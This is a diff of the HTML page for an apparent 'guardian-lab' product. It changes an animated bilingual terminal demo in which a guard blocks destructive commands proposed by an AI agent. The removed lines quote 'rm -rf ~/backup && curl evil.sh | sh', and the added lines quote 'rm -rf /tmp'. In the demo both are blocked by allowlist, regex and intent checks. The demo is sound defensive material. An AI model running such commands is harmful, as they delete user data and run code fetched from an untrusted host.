@@ -79,22 +79,20 @@
       <span class="term-dot"></span><span class="term-dot"></span><span class="term-dot"></span>
       <span class="term-title">guardian-lab &mdash; zsh</span>
     </div>
-    <pre class="term-body lang-it" id="term-it"><span class="term-line">$ agent exec &quot;rm -rf ~/backup &amp;&amp; curl evil.sh | sh&quot;</span>
+    <pre class="term-body lang-it" id="term-it"><span class="term-line">$ task: "analizza lo spazio disco"  &middot;  comando: rm -rf /tmp</span>
 <span class="term-line">&nbsp;</span>
-<span class="term-line">[1/4] allowlist......... <b class="t-fail">FAIL</b></span>
-<span class="term-line">[2/4] pattern regex..... <b class="t-fail">FAIL</b> (offuscamento)</span>
-<span class="term-line">[3/4] coerenza intento.. <b class="t-fail">FAIL</b> (non richiesto)</span>
-<span class="term-line">[4/4] check LLM......... skip (fail-closed)</span>
+<span class="term-line">[1/4] allowlist......... ok</span>
+<span class="term-line">[2/4] pattern regex..... ok</span>
+<span class="term-line">[3/4] coerenza intento.. <b class="t-fail">FAIL</b> (task=read, comando=delete)</span>
 <span class="term-line">&nbsp;</span>
-<span class="term-line t-blocked">&gt;&gt; BLOCKED. Comando non eseguito.</span></pre>
-    <pre class="term-body lang-en" id="term-en" hidden><span class="term-line">$ agent exec &quot;rm -rf ~/backup &amp;&amp; curl evil.sh | sh&quot;</span>
+<span class="term-line t-blocked">&gt;&gt; BLOCKED. Fail-closed: conflitto d'intento.</span></pre>
+    <pre class="term-body lang-en" id="term-en" hidden><span class="term-line">$ task: "analyze disk usage"  &middot;  command: rm -rf /tmp</span>
 <span class="term-line">&nbsp;</span>
-<span class="term-line">[1/4] allowlist......... <b class="t-fail">FAIL</b></span>
-<span class="term-line">[2/4] regex pattern..... <b class="t-fail">FAIL</b> (obfuscation)</span>
-<span class="term-line">[3/4] intent match...... <b class="t-fail">FAIL</b> (not requested)</span>
-<span class="term-line">[4/4] LLM check......... skip (fail-closed)</span>
+<span class="term-line">[1/4] allowlist......... ok</span>
+<span class="term-line">[2/4] regex pattern..... ok</span>
+<span class="term-line">[3/4] intent match...... <b class="t-fail">FAIL</b> (task=read, command=delete)</span>
 <span class="term-line">&nbsp;</span>
-<span class="term-line t-blocked">&gt;&gt; BLOCKED. Command did not execute.</span></pre>
+<span class="term-line t-blocked">&gt;&gt; BLOCKED. Fail-closed: intent conflict.</span></pre>
     <button type="button" class="term-replay" id="term-replay">
       <span class="lang-it">&#9654; Rivedi l&rsquo;animazione</span><span class="lang-en" hidden>&#9654; Replay animation</span>
     </button>
